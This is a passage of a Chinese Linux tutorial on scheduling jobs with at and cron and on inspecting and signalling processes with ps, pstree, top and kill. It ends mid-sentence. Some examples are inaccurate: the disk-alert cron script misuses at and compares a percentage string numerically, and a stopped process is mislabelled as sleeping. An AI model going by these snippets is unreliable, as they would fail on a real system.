~]# cd /tmp[root@wyf tmp]# pwd/tmp[root@wyf tmp]# cat at-test.txt当前shell：  /usr/bin/bash\n\n2.3 实战场景入门场景1：延迟执行高风险操作-删除12345[root@wyf tmp]# at now +1 minuteswarning: commands will be executed using /bin/shat&gt; rm -rf /tmp/at-test.txtat&gt; &lt;EOT&gt;job 2 at Wed Aug  6 19:59:00 2025\n\n场景2：固定时间任务-每天凌晨2点备份数据库12345[root@wyf ~]# at 02:00 tomorrowwarning: commands will be executed using /bin/shat&gt; tar -zcf /backup/db_$(date +%F).tar.gz /var/lib/mysqlat&gt; &lt;EOT&gt;job 2 at Wed Aug  6 19:59:40 2025\n\n date命令解释：\n​\tdate 的格式化符号以 % 开头，后接特定字母表示不同时间单位。以下是常用符号及其含义：\n\n场景3：复杂时间格式​\t支持灵活时间描述：\n​\t\tnow：立即执行\n​\t\ttoday &#x2F; tomorrow：当天&#x2F;次日\n​\t\tYYYY-MM-DD HH:MM：绝对时间\n​\t\t+N days &#x2F; -N minutes：相对时间\n​\t示例：\n​\t\t2025年12月25日23:59执行关机：\n123at 23:59 Dec 25 2025shutdown -h nowCtrl+D 提交\n\n2.4 管理命令\n1234567891011121314[root@wyf tmp]# atq[root@wyf tmp]# at now +5 minuteswarning: commands will be executed using /bin/shat&gt; touch /tmp/5at&gt; &lt;EOT&gt;job 3 at Wed Aug  6 20:06:00 2025[root@wyf tmp]# atq3\tWed Aug  6 20:06:00 2025 a root[root@wyf tmp]# at -c 3#!/bin/sh# atrun uid=0 gid=0# mail root 0umask 22\n\n三、 cron命令详解3.1 cron 核心功能cron 是 Linux&#x2F;Unix 系统中用于周期性执行任务的守护进程，适合以下场景：\n​\t定时备份：每日&#x2F;每周自动备份数据。\n​\t日志清理：定时删除过期日志文件。\n​\t数据同步：每小时同步服务器间数据。\n​\t监控报警：检测服务状态并发送通知。\n3.2 配置文件​\t系统级：&#x2F;etc&#x2F;crontab 编辑模板（所有用户生效）。\n123456789101112131415[root@wyf etc]# cat crontab SHELL=/bin/bashPATH=/sbin:/bin:/usr/sbin:/usr/binMAILTO=root# For details see man 4 crontabs# Example of job definition:# .---------------- minute (0 - 59)# |  .------------- hour (0 - 23)# |  |  .---------- day of month (1 - 31)# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat# |  |  |  |  |# *  *  *  *  * user-name  command to be executed\n\n​\t语法格式：\n12* * * * * 用户名 命令分钟 小时 日 月 星期\n\n3.3 时间表达式​\t字段说明：\n\n​\t示例：\n120 2 * * * root /usr/bin/systemctl restart nginx    #每日凌晨2点重启Nginx30 4 * * 1-5 user1 /home/user1/backup.sh           # 工作日每天4:30备份\n\n3.4 管理命令详解crontab 是 cron 的配置工具，用于安装、删除、编辑用户的计划任务。以下是常用命令：\n\n1.  crontab -e：编辑任务​\t功能：\n​\t\t打开当前用户的 ~&#x2F;.crontab 文件，支持 vi 或 nano 编辑器（取决于系统默认）。\n​\t使用场景： \n​\t\t添加、修改或删除个人定时任务。\n​\t示例：\n123# 添加每日备份任务crontab -e0 3 * * * touch /tmp/test2.txt\n\n​\t保存退出后，任务自动生效。\n2.  crontab -l：列出任务​\t功能： \n​\t\t显示当前用户的所有计划任务（格式化输出）。 \n​\t示例：\n12[root@wyf ~]# crontab -l0 3 * * * touch /tmp/test2.txt\n\n3.  crontab -r：删除任务​\t功能： \n​\t\t永久删除当前用户的所有计划任务。 \n​\t示例：\n1crontab -r\n\n4. crontab -u username：管理其他用户​\t功能：\n​\t\t\t需要 sudo 权限，用于查看&#x2F;编辑其他用户的任务。\n​\t示例：\n12345[root@wyf ~]# crontab -u user777 -eno crontab for user777 - using an empty onecrontab: installing new crontab[root@wyf ~]# crontab -u user777 -l0 3 * * * touch /tmp/user777\n\n3.5 使用方法场景1：每两个月的工作日的凌晨3点打包备份日志&#x2F;var&#x2F;log&#x2F;secure可以在&#x2F;etc&#x2F;crontab中直接编辑，也可以使用命令crontab -e 进行编辑\n1234567891011121314151617181920212223242526272829303132333435363738394041# 编辑用户级crontabcrontab -e# 添加任务（每天3:00执行）0 3 * 1，3，5，7，9，11 1-5 root tar -zcf /tmp/log.tar.gz /var/log/secure#该命令执行后的效果有两个问题1.tar打包命令最好使用相对路径#修改0 3 * 1，3，5，7，9，11 1-5 root cd /var/log;tar -zcf /tmp/log.tar.gz secure#使用&#x27;;&#x27;分割两条命令[root@wyf ~]# date2025年 08月 06日 星期三 20:13:49 CST[root@wyf ~]# crontab -e* 20 6 8 * root cd /var/log;tar -zcf /tmp/log.tar.gz secureno crontab for root - using an empty onecrontab: installing new crontab[root@wyf tmp]# ll | grep log.tar.gz-rw-r--r--. 1 root root   45 8月   6 20:15 log.tar.gz[root@wyf tmp]# ll | grep log.tar.gz-rw-r--r--. 1 root root   45 8月   6 20:16 log.tar.gz#修改[root@wyf tmp]# touch logs`date +%H:%M`.txt[root@wyf tmp]# ls | grep logslogs20:16.txt[root@wyf tmp]# crontab -e* 20 6 8 * root cd /var/log;tar -zcf /tmp/log`date +\\%H:\\%M`.tar.gz securecrontab: installing new crontab[root@wyf tmp]# ll | grep log-rw-r--r--. 1 root root 2066 7月  28 19:41 anaconda.log-rw-r--r--. 1 root root 2604 7月  28 19:40 dbus.log-rw-r--r--. 1 root root    0 7月  28 19:40 ifcfg.log-rw-r--r--. 1 root root    0 8月   6 20:16 logs20:16.txt-rw-r--r--. 1 root root   45 8月   6 20:17 log.tar.gz-rw-r--r--. 1 root root    0 7月  28 19:40 packaging.log-rw-r--r--. 1 root root  131 7月  28 19:40 program.log-rw-r--r--. 1 root root    0 7月  28 19:40 sensitive-info.log-rw-r--r--. 1 root root    0 7月  28 19:40 storage.log\n\n四、 at vs cron对比分析\n五、 总结与实战案例5.1 关键总结​\tat ：适合一次性任务（如临时重启服务、延迟执行敏感操作）。\n​\tcron ：适合长期周期任务（如每日备份、定时监控）。\n5.2 综合案例：自动化运维​\t需求：\n​\t\t每日凌晨2点备份网站数据到远程服务器。\n10 2 * * * root ./linux.sh\n\n​\t\t每小时检查服务器磁盘使用率，超过90%时发邮件报警。\n解决方案：github搜索脚本，按时运行！\n​\t1.使用 cron 备份：\n10 2 * * * rsync -avz /www/user123.com/ user@remote:/backup/\n\n​\t2.使用 at 发送报警：\n123456789# 每小时检查磁盘0 * * * * df -h | grep /dev/sda1 | awk &#x27;&#123;print $5&#125;&#x27; | while read -r usage; do\tif [ &quot;$usage&quot; -gt 90 ]; then \t\tat now + 5 minutes -t Asia/Shanghai \t\tmail -s &quot;Disk Alert!&quot; admin@example.com &lt;&lt;&lt; &quot;Disk usage on /dev/sda1 is $usage%&quot;\tfidone\n\n","slug":"计划任务","date":"2025-08-06T07:24:48.000Z","categories_index":"","tags_index":"Linux","author_index":"wyf"},{"id":"d655af595b90ac0e0949f931f50e7fe8","title":"进程管理","content":"进程管理一、进程是什么？\n定义： 进程是正在执行的程序实例。当程序被加载到内存中运行时，操作系统会为其分配资源（CPU、内存、文件等），形成一个独立的执行单元。\n\n类比理解：\n\n程序 &#x3D; 菜谱（静态的指令集合）\n进程 &#x3D; 实际烹饪过程（动态执行，占用厨房、食材等资源）\n\n\n程序 vs 进程：\n\n程序：二进制文件（静态）如/usr/bin/passwd\n进程：程序运行过程（动态），有生命周期及状态\n\n\n进程来源：\n\n父进程通过 fork 创建子进程\n所有进程的祖先进程：\nCentOS 5&#x2F;6:  init\nCentOS 7&#x2F;8:  systemd\n\n\n\n\n\n二、进程的核心组成每个进程包含以下关键元素：\n1、PID（进程ID）\n在Linux系统中，PID（Process ID） 是 进程标识符（Process Identifier） 的缩写。它是一个唯一且 非负的整数，用于在操作系统中唯一标识一个正在运行的进程。每个进程（包括程序、服务、后台任务 等）启动时都会被分配一个PID，系统通过PID管理和跟踪进程的生命周期。\n\n12345678[root@wyf 桌面]# ps   PID TTY          TIME CMD  2777 pts/0    00:00:00 bash  3067 pts/0    00:00:00 ps                  #输第一次ps命令，会产生pid为6761的进程[root@wyf 桌面]# ps   PID TTY          TIME CMD  2777 pts/0    00:00:00 bash  3074 pts/0    00:00:00 ps                  #第二次，6768\n\n\n也有些服务类的会产生守护进程(也就是一直在运行中的进程，除非关闭了)\n\n123456[root@wyf 桌面]# ps -e |grep httpd  1121 ?        00:00:00 httpd  1156 ?        00:00:00 httpd  1160 ?        00:00:00 httpd  1161 ?        00:00:00 httpd  1164 ?        00:00:00 httpd\n\n\n进程还可能会产生子进程。一个父进程复制自己(fork)来创建一个新的子进程。每个进程分配一个唯一的 标识(pid)，其父进程的标识为ppid. 在 centos 8,centos 7中第一个第1个进程为systemd,在centos6及以 前版本第1 个进程为init.\n\n1234567[root@wyf 桌面]# pstreesystemd─┬─ModemManager───2*[&#123;ModemManager&#125;]        ├─NetworkManager───2*[&#123;NetworkManager&#125;]        ├─VGAuthService        ├─accounts-daemon───2*[&#123;accounts-daemon&#125;]        ├─alsactl        ...\n\n2、程序代码\n需要执行的指令（即程序本身）。\n\n3、运行资源\n内存空间：代码、数据、堆栈。\nCPU时间片：由操作系统调度分配。\n文件&#x2F;设备：打开的文件、网络端口等。\n\n4、运行状态\n运行状态产生原因：CPU时间片轮转\n如运行中（R）、休眠（S）、僵尸（Z）等（可通过 ps 命令查看）。\n\n三、进程的生命周期进程从创建到结束经历以下阶段：\n1234graph LR    A[创建] --&gt; B[就绪] --&gt; C[运行] --&gt; D[等待/休眠] --&gt; C    C --&gt; E[终止]    D --&gt; B\n\n\n创建：通过 fork() 系统调用由父进程生成。\n就绪：已分配资源，等待CPU调度。\n运行：CPU正在执行其指令。\n等待：因I&#x2F;O操作或信号暂停执行。\n终止：正常结束或被强制杀死（kill）。\n\n四、Linux 进程状态\n\n\n状态符号\n英文全称\n中文名\n触发场景\n是否可被强制终止\n\n\n\nR\nRunning &#x2F; Runnable\n运行&#x2F;可运行\n正在占用 CPU 或等待 CPU 调度（位于运行队列）\n✅ 是\n\n\nS\nInterruptible Sleep\n可中断睡眠\n等待外部事件完成（如 I&#x2F;O 操作、用户输入），可被信号唤醒\n✅ 是（但可能失效）\n\n\nD\nUninterruptible Sleep\n不可中断睡眠\n等待关键硬件操作完成（如磁盘写入），无视任何信号（包括 kill -9）\n❌ 否\n\n\nT\nStopped\n暂停&#x2F;停止\n被信号暂停（如 Ctrl+Z 或 kill -STOP）\n✅ 是（需先恢复）\n\n\nt\nTracing Stop\n调试暂停\n被调试器暂停（如 gdb 设置断点）\n✅ 是\n\n\nZ\nZombie\n僵尸进程\n进程已结束，但父进程未通过 wait() 回收资源（残留进程描述符）\n❌ 否（需父进程处理）\n\n\nX\nDead (Exit)\n完全终止\n进程彻底结束（仅在瞬时状态可见，常规命令不显示）\n-\n\n\nI\nIdle\n空闲内核线程\n内核线程处于空闲状态（Linux 4.0+ 引入）\n-\n\n\n1、运行&#x2F;可运行（R）\n特征：进程正在使用 CPU 或等待 CPU 调度（就绪状态）。\n\n查看命令：\n12top   # 按 R 排序查看占用 CPU 的进程ps aux | grep &#x27; R &#x27;\n\n2、睡眠状态（S 和 D）\n\n\n状态\n典型场景\n风险\n\n\n\nS 状态\n- 读取用户输入  - 网络请求等待  - 磁盘读写（缓存层响应）\n可能因信号中断导致操作失败\n\n\nD 状态\n- 直接磁盘同步写入（O_SYNC 模式）  - 内核关键任务（如 NFS 网络锁）\n系统卡顿主因！需等待硬件完成，无法强制终止\n\n\n\n\n\n\n\n\n\n\n\n⚠️ 注意：若系统频繁出现 D 状态进程，需检查磁盘&#x2F;网络硬件状态或驱动问题。\n3、暂停状态（T 和 t）\n触发方式：\n12Ctrl + Z          # 前台进程暂停（生成 SIGTSTP 信号）kill -STOP PID    # 手动暂停进程\n\n恢复方式：\n123fg %1             # 前台恢复（指定作业号）bg %1             # 后台恢复kill -CONT PID    # 发送继续信号\n\n4、僵尸进程（Z）\n成因：\n父进程未调用 wait()/waitpid() 回收子进程资源。\n父进程意外终止（子进程由 init 接管后自动回收）。\n\n\n危害：占用 PID 资源（最终导致新进程无法创建）。\n解决方案：\n重启父进程（自动回收僵尸）。\n手动杀死父进程（僵尸由 init 接管清理）。\n无法直接杀死僵尸进程（因其已结束）！\n\n\n\n5、命令操作指南123#查看状态ps aux | awk &#x27;&#123;print $8&#125;&#x27; | sort | uniq -c  # 统计各状态进程数量top -b -n 1 | grep -E &#x27; R | S | D | Z &#x27;    # 过滤特定状态\n\n6、处理异常进程\nD 状态进程：\n\n排查硬件问题（磁盘坏道、存储挂载）。\n重启关联服务（如 NFS）。\n\n\nZ 状态进程：\n12pstree -p | grep -C 10 &lt;僵尸PID&gt;  # 定位父进程kill -HUP &lt;父进程PID&gt;            # 重启父进程（优雅回收）\n\n五、PID1、PID的核心作用1.唯一标识进程​\t每个进程的PID在系统范围内是唯一的（同一时刻不会重复），通过PID可以精准定位到具体的进程。 \n2.进程管理​\t系统工具（如   kill 、 top 、ps）和用户通过PID对进程进行控制，例如： \n​\t终止进程：kill -9 PID \n​\t查看进程资源占用： top -p PID \n​\t调试进程： gdb -p PID \n3.进程间通信（IPC）​\t进程间通信（如信号、管道、共享内存）通常需要指定目标进程的PID。 \n2、PID的分配规则1.取值范围​\tPID从 1 开始分配（系统启动后的第一个进程是  init 或  systemd ，PID&#x3D;1）。 \n​\t最大PID值由内核参数  &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;pid_max 定义（默认通常为  32768 ）。 \n​\t当PID达到最大值时，会循环使用已释放的PID（但不会重复分配给仍在运行的进程）。 \n2.回收机制​\t进程终止后，其PID会被释放，供后续新进程使用。 \n3、PID的特殊角色1.PID&#x3D;1（Init进程）​\t系统启动后的第一个进程，负责启动和管理其他所有用户进程。 \n​\t如果PID&#x3D;1的进程终止，系统会触发内核恐慌（Kernel Panic）并崩溃。 \n2.父进程PID（PPID）​\t每个进程（除Init）都有父进程（Parent Process），父进程的PID称为  PPID。 \n​\t通过p s -ef查看PPID：\n12345ps -ef | grep &lt;进程名&gt;# 输出示例：# UID      PID       PPID       C       STIME      TTY       TIME CMD   # root     1234        1        0       Aug01       ?        00:00:00 nginx: master process#第三列（PPID）是父进程的PID（如 1 表示由Init进程启动）。\n\n四、进程 vs 线程\n\n\n特性\n进程\n线程\n\n\n\n独立性\n资源隔离，崩溃不影响其他进程\n共享同一进程资源，崩溃可能导致整个进程终止\n\n\n创建开销\n大（需复制资源）\n小（共享进程资源）\n\n\n通信方式\n管道、信号、Socket等\n直接读写共享内存\n\n\n典型应用场景\n需要隔离的独立任务（如浏览器）\n高并发任务（如Web服务器）\n\n\n五、为什么需要进程？\n并发执行\n 操作系统通过进程调度实现多个程序“同时运行”（宏观并行）。\n\n资源隔离\n 一个进程崩溃不会直接影响其他进程（提升系统稳定性）。\n\n权限控制\n 为不同进程分配不同系统权限（如用户进程 vs 系统守护进程）。\n\n\n六、操作系统的关键支持\n进程调度器：决定哪个进程何时使用CPU（如 Linux 的 CFS 调度器）。\n内存管理：为进程分配&#x2F;回收内存，防止越界访问。\n进程间通信（IPC）：提供共享内存、消息队列等机制。\n\n七、进程管理（ps、pstree、top）1、静态查看进程 psps （Process Status）是 Linux 中用于查看当前系统进程状态的工具。它可以显示进程的详细信息，如进程 ID（PID）、CPU 和内存占用、运行时间、命令行参数等。\n1.基本语法12ps [选项]ps aux \n\n2.常用选项\n示例：\n1234567891011121314151617181920[root@wyf 桌面]# ps -e   PID TTY          TIME CMD     1 ?        00:00:02 systemd     2 ?        00:00:00 kthreadd     3 ?        00:00:00 rcu_gp     4 ?        00:00:00 rcu_par_gp     6 ?        00:00:00 kworker/0:0H     8 ?        00:00:00 mm_percpu_wq     9 ?        00:00:00 ksoftirqd/0    10 ?        00:00:00 rcu_sched    11 ?        00:00:00 migration/0    12 ?        00:00:00 watchdog/0    13 ?        00:00:00 cpuhp/0    14 ?        00:00:00 cpuhp/1    15 ?        00:00:00 watchdog/1    16 ?        00:00:00 migration/1    17 ?        00:00:00 ksoftirqd/1    19 ?        00:00:00 kworker/1:0H-kblockd    21 ?        00:00:00 kdevtmpfs\n\ntty字段解析：\n表示物理控制终端\n12[root@wyf 桌面]# tty/dev/pts/0\n\n在 ps 命令的输出中，TTY 列表示进程关联的终端设备 \n​\ttty：进程运行在物理控制台终端。 \n​\tpts&#x2F;0：进程运行在伪终端（如图形界面的终端或 SSH 会话）。 \n​\t?：进程不关联任何终端（如守护进程或内核线程）\n1234567891011121314151617181920212223[root@wyf 桌面]# ps -a                      #所有由终端创建的进程，不包含bash\\shell，不包含守护进程（sshd,nginx等）   PID TTY          TIME CMD  1878 tty1     00:00:00 gnome-session-b  1893 tty1     00:00:05 gnome-shell  1937 tty1     00:00:00 Xwayland  1957 tty1     00:00:00 ibus-daemon  1960 tty1     00:00:00 ibus-dconf  1963 tty1     00:00:00 ibus-x11  2005 tty1     00:00:00 gsd-xsettings  2007 tty1     00:00:00 gsd-a11y-settin  2012 tty1     00:00:00 gsd-clipboard  2014 tty1     00:00:00 gsd-color  2023 tty1     00:00:00 gsd-datetime  2025 tty1     00:00:00 gsd-housekeepin  2029 tty1     00:00:00 gsd-keyboard  2033 tty1     00:00:00 gsd-media-keys  2036 tty1     00:00:00 gsd-mouse  2041 tty1     00:00:00 gsd-power  2046 tty1     00:00:00 gsd-print-notif  2049 tty1     00:00:00 gsd-rfkill  2060 tty1     00:00:00 gsd-screensaver  2062 tty1     00:00:00 gsd-sharing  2067 tty1     00:00:00 gsd-smartcard\n\n123456789101112131415161718[root@wyf 桌面]# ps -x   #守护进程（sshd,nginx)内核线程、系统服务（systemd-journald)、计划任务（cron)、容器（dockerd)    PID TTY      STAT   TIME COMMAND     1 ?        Ss     0:02 /usr/lib/systemd/systemd --switched-root --system --     2 ?        S      0:00 [kthreadd]     3 ?        I&lt;     0:00 [rcu_gp]     4 ?        I&lt;     0:00 [rcu_par_gp]     6 ?        I&lt;     0:00 [kworker/0:0H]     8 ?        I&lt;     0:00 [mm_percpu_wq]     9 ?        S      0:00 [ksoftirqd/0]    10 ?        I      0:00 [rcu_sched]    11 ?        S      0:00 [migration/0]    12 ?        S      0:00 [watchdog/0]    13 ?        S      0:00 [cpuhp/0]    14 ?        S      0:00 [cpuhp/1]    15 ?        S      0:00 [watchdog/1]    16 ?        S      0:00 [migration/1]    17 ?        S      0:00 [ksoftirqd/1]    19 ?        I&lt;     0:00 [kworker/1:0H-kblockd]\n\n1234567891011[root@wyf 桌面]# ps -u root            # 显示 root 用户的进程   PID TTY          TIME CMD     1 ?        00:00:02 systemd     2 ?        00:00:00 kthreadd     3 ?        00:00:00 rcu_gp     4 ?        00:00:00 rcu_par_gp     6 ?        00:00:00 kworker/0:0H     8 ?        00:00:00 mm_percpu_wq     9 ?        00:00:00 ksoftirqd/0    10 ?        00:00:00 rcu_sched    11 ?        00:00:00 migration/0\n\nstat 字段解析：在 Linux 的 ps 命令中，STAT（Process State）字段表示进程的当前状态。每个状态由1个主字母和可选的修饰符组成（如 R+、Ss）\n\nR（Running &#x2F; Runnable）运行&#x2F;可运行状态 \n​\t通俗解释： \n​\t就像在银行排队等叫号的人。 \n​\t\t正在运行：当前正在窗口办理业务（实际在用 CPU）。 \n​\t\t可运行：已经取号，坐在椅子上等待叫号（在 CPU 的等待队列中）。 \n​\t实际场景： \n​\t你用 top 命令看到的 CPU 使用率高的进程，通常处于 R 状态。\n12[root@wyf 桌面]# ps aux | grep &#x27; R &#x27;         # 查找 R 状态进程root       3830  0.0  0.0  12320  1060 pts/0    S+   16:56   0:00 grep --color=auto  R \n\n S（Interruptible Sleep）可中断睡眠 \n​\t通俗解释： \n​\t\t你点外卖后等外卖，但可以边等外卖边刷手机。如果快递到了（事件发生），你就去取；如果不想等了（收到信号），可以取消订单。\n​\t实际场景：\n​\t\t进程等待用户输入（如 vim 未操作时）。 \n​\t\t等待网络响应（如浏览器加载网页时）。 \n​\t\t唤醒方式：按回车键、收到信号（如  Ctrl+C 终止进程）。\n1sleep 100  # 输入后按 Ctrl+Z，进程进入 S 状态\n\nD（Uninterruptible Sleep）不可中断睡眠 \n​\t通俗解释： \n​\t\t你在手术室做手术，医生让你别动。此时即使有人叫你（发信号），你也无法回应，必须等手术完成。 \n​\t实际场景： \n​\t\t进程等待磁盘 I&#x2F;O（如写入大文件到 U 盘，突然拔掉 U 盘）。 \n​\t\t风险：进程卡在 D 状态无法终止（即使 kill -9 也无效）。\n​\t\t解决方案：重启系统或修复硬件&#x2F;驱动。\n12[root@wyf 桌面]# ps aux | grep &#x27; D &#x27;         # 查找 D 状态进程root       3903  0.0  0.0  12320  1052 pts/0    R+   17:01   0:00 grep --color=auto  D \n\nZ（Zombie）僵尸进程\n​\t通俗解释： \n​\t\t餐厅吃完饭，服务员（父进程）没来收拾桌子（回收资源），桌子一直占着。 \n​\t实际场景： \n​\t\t父进程未正确处理子进程的终止状态。 \n​\t\t无害性：僵尸进程不占用 CPU&#x2F;内存，只占一个 PID。 \n​\t\t清理方法：\n1kill -9 父进程PID  # 终止父进程，僵尸进程由 init 回收\n\n T（Stopped）暂停状态 \n​\t通俗解释： \n​\t\t你正在看视频，突然按下暂停键，画面定格。 \n​\t实际场景： \n​\t\t用 Ctrl+Z 暂停前台进程（如  ping 命令）。\n​\t\t恢复方法：\n12$ bg  # 让进程后台继续运行（状态变回 S）$ fg  # 让进程回到前台运行（状态变回 R/S）\n\n t（Tracing Stop）调试暂停\n通俗解释： \n​\t程序员用调试器（如 GDB）一步步执行代码，遇到断点暂停。\n实际场景：\n​\t用 gdb 调试程序时，进程会在断点处暂停。\n​\t恢复方法：在调试器中输入 continue。\n X（Dead）死亡状态\n​\t通俗解释： \n​\t\t人去世后火化，骨灰盒已下葬（进程资源完全释放）。\n​\t实际场景：\n​\t\t进程终止后，内核将其标记为 X，但 ps 几乎不会显示（瞬间消失）。\n​\t\t无需处理：系统自动回收资源。\n I（Idle）空闲状态（内核线程）\n​\t 通俗解释： \n​\t\t工厂的机器人在没有生产任务时进入待机状态。\n​\t实际场景：\n​\t\t内核线程（如 kworker）在没有任务时的状态。\n​\t\t无需关注：属于系统正常行为。\t\n\n\n\n\n过滤进程\n\n12ps -p 1234         # 显示 PID=1234 的进程ps -C nginx        # 显示所有名为 &quot;nginx&quot; 的进程\n\n动态排序\n\n1ps -e --sort=-%mem  # 按内存使用降序显示所有进程\n\n树状显示进程关系\n\n1ps -ef --forest  # 显示进程树\n\n3.输出字段详解\n4.常用组合选项（1）经典组合：ps aux1ps aux\n\n说明：BSD 风格，显示所有进程的详细信息。 \n输出字段：USER、PID、%CPU、%MEM、VSZ、RSS、TTY、STAT、START、TIME、COMMAND.\n（2）系统进程查看： ps -ef1ps -ef\n\n说明：Unix 风格，显示所有进程的完整信息。输出字段：UID、PID、PPID、C、STIME、TTY、TIME、CMD.\n5.自定义输出格式使用 -o 选项指定显示的字段：\n1ps -eo pid,user,%cpu,%mem,cmd --sort=-%cpu | head\n\n说明：显示 PID、用户、CPU 占用、内存占用和命令，按 CPU 降序排序。\n6.实际应用场景（1）查找进程的 PID1ps aux | grep nginx      # 查找 nginx 进程的 PID\n\n（2）监控资源占用1ps -eo pid,%cpu,%mem,cmd --sort=-%mem | head  # 查看最耗内存的进程\n\n（3）杀死进程前的确认1ps -p 5678 -o pid,cmd    # 确认 PID=5678 的进程是否为目标进程\n\n（4）查看进程树1ps -ef --forest          # 显示父子进程关系\n\n2、pstree1.pstree 是什么？pstree 是 Linux 下的进程树查看工具，以树形图可视化进程间的父子关系。\n\n优势：比 ps 更直观展示进程继承结构。\n根节点：通常是 systemd（现代系统）或 init（PID&#x3D;1）。\n\n2.核心功能（1）基础用法1pstree        # 默认以树状图显示所有进程\n\n输出示例：\n12345systemd─┬─ModemManager───2*[&#123;ModemManager&#125;]        ├─NetworkManager─┬─dhclient        │                └─2*[&#123;NetworkManager&#125;]        ├─sshd───sshd───bash───pstree  # 用户登录链        └─dockerd───10*[&#123;dockerd&#125;]      # 多线程进程\n\n（2）标识符号说明\n\n\n符号\n含义\n\n\n\n─\n子进程（单进程）\n\n\n┬─\n有多个子进程的父节点\n\n\n└─\n最后一个子进程\n\n\n*&#123;N&#125;\n重复进程&#x2F;线程组的数量\n\n\n()\n守护进程或线程组名\n\n\n\n\n\n\n\n\n\n\n\n例如 2*[&#123;NetworkManager&#125;] 表示存在 2 个同名线程。\n3.常用选项详解\n\n\n选项\n作用\n示例\n\n\n\n-p\n显示 PID\npstree -p\n\n\n-s &lt;PID&gt;\n显示指定进程的祖先链\npstree -s 1145（查看 PID&#x3D;1145 的上层）\n\n\n-u\n显示进程所有者切换\npstree -u（显示 UID 变化点）\n\n\n-a\n显示完整命令行参数\npstree -a\n\n\n-h\n高亮当前进程及其祖先\npstree -h $$（高亮当前 Shell）\n\n\n-H &lt;PID&gt;\n高亮指定 PID 的进程及其祖先\npstree -H 1145\n\n\n-T\n隐藏线程，只显示进程\npstree -T\n\n\n-n\n按 PID 数值排序（默认按进程名排序）\npstree -n\n\n\n4.实战场景示例（1）定位进程来源1pstree -sp 4567     # 显示 PID=4567 的完整祖先链\n\n输出：\n12systemd(1)───nginx(1000)───php-fpm(4567)# 说明：4567 是 nginx 通过 php-fpm 启动的 PHP 进程\n\n（2）查看用户进程树1pstree -u user1     # 只显示 user1 的进程树\n\n输出：\n12sshd(1234)───bash(1235)───vim(1260)# 用户通过 SSH 登录后启动 vim\n\n（3）高亮关键进程1pstree -h 4567      # 高亮 PID=4567 及其父进程\n\n输出效果（终端彩色显示）：\n12systemd─┬─nginx───php-fpm───**4567(php-fpm)**        └─mysqld\n\n（4）显示完整命令参数1pstree -a           # 展示启动命令参数\n\n输出：\n123systemd splash --auto  └─dockerd -H fd:// --containerd=/run/...    └─docker run -it --name=ubuntu ubuntu:20.04 /bin/bash\n\n5.高级技巧（1）结合 grep 过滤进程1pstree -p | grep -A 5 &#x27;nginx&#x27;  # 显示 nginx 及其子进程（5行上下文）\n\n（2）统计进程下的线程数1pstree -T -p 1145 | wc -l     # 统计 PID=1145 的线程数量\n\n（3）快速确认是否存在僵尸进程1pstree | grep -C 3 &#x27;Z&#x27;        # 显示含僵尸进程的上下文\n\n输出标识：defunct 或 Z（若使用 pstree -p 显示 PID）。\n3、动态查看进程 toptop 是 Linux 中最常用的实时系统监控工具，能够动态显示 进程资源占用 和 系统整体状态。它提供了交互式操作，方便用户快速分析性能瓶颈。\n1.基础语法12top                # 启动 topq 或 Ctrl+C        # 退出 top \n\n\n2.界面解析top 界面分为摘要区（系统概览）和进程列表区（实时进程信息） \n上半部分（系统概览）\n​\t1.系统时间&#x2F;负载 \n​\t2.任务统计（176 total） \n​\t3.CPU使用分布（99.7% idle） \n​\t4.内存使用（3.8GB total） \n​\t5.Swap使用（4.0GB free） \n下半部分（进程列表）\n\n3.交互式命令（运行中按快捷键）\n4.常用操作\n4、信号控制1.信号列表1234567891011121314[root@wyf 桌面]# kill -l      # 查看所有信号 1) SIGHUP\t 2) SIGINT\t 3) SIGQUIT\t 4) SIGILL\t 5) SIGTRAP 6) SIGABRT\t 7) SIGBUS\t 8) SIGFPE\t 9) SIGKILL\t10) SIGUSR111) SIGSEGV\t12) SIGUSR2\t13) SIGPIPE\t14) SIGALRM\t15) SIGTERM16) SIGSTKFLT\t17) SIGCHLD\t18) SIGCONT\t19) SIGSTOP\t20) SIGTSTP21) SIGTTIN\t22) SIGTTOU\t23) SIGURG\t24) SIGXCPU\t25) SIGXFSZ26) SIGVTALRM\t27) SIGPROF\t28) SIGWINCH\t29) SIGIO\t30) SIGPWR31) SIGSYS\t34) SIGRTMIN\t35) SIGRTMIN+1\t36) SIGRTMIN+2\t37) SIGRTMIN+338) SIGRTMIN+4\t39) SIGRTMIN+5\t40) SIGRTMIN+6\t41) SIGRTMIN+7\t42) SIGRTMIN+843) SIGRTMIN+9\t44) SIGRTMIN+10\t45) SIGRTMIN+11\t46) SIGRTMIN+12\t47) SIGRTMIN+1348) SIGRTMIN+14\t49) SIGRTMIN+15\t50) SIGRTMAX-14\t51) SIGRTMAX-13\t52) SIGRTMAX-1253) SIGRTMAX-11\t54) SIGRTMAX-10\t55) SIGRTMAX-9\t56) SIGRTMAX-8\t57) SIGRTMAX-758) SIGRTMAX-6\t59) SIGRTMAX-5\t60) SIGRTMAX-4\t61) SIGRTMAX-3\t62) SIGRTMAX-263) SIGRTMAX-1\t64) SIGRTMAX\t\n\n2.常用信号\n\n\n信号编号\n信号名\n默认行为\n使用场景\n触发命令示例\n\n\n\n1\nSIGHUP\n终止进程\n重载配置（守护进程不终止） 例：nginx 重读配置文件\nkill -1 $(pidof nginx)\n\n\n2\nSIGINT\n终止进程\n键盘中断（Ctrl+C）\n前台进程按 Ctrl+C\n\n\n3\nSIGQUIT\n终止 + 核心转储\n优雅退出并调试（Ctrl+\\）\n前台进程按 Ctrl+\\\n\n\n9\nSIGKILL\n强制终止\n进程无响应时强制杀死（无视进程状态）⚠️ 慎用！\nkill -9 1145\n\n\n15\nSIGTERM\n终止进程（默认）\n优雅终止（允许进程清理资源后再退出）\nkill 1145 或 kill -15 1145\n\n\n18\nSIGCONT\n继续运行\n唤醒被暂停的进程（SIGSTOP 后恢复）\nkill -18 1145\n\n\n19\nSIGSTOP\n暂停进程\n强制暂停（不可捕获&#x2F;忽略） 类似 Ctrl+Z\nkill -19 1145\n\n\n20\nSIGTSTP\n暂停进程\n键盘暂停（Ctrl+Z）（进程可捕获处理）\n前台进程按 Ctrl+Z\n\n\n⚠️ 重点：\n\n优先使用 SIGTERM (15)：给进程清理资源的机会（如保存数据）。\nSIGKILL (9) 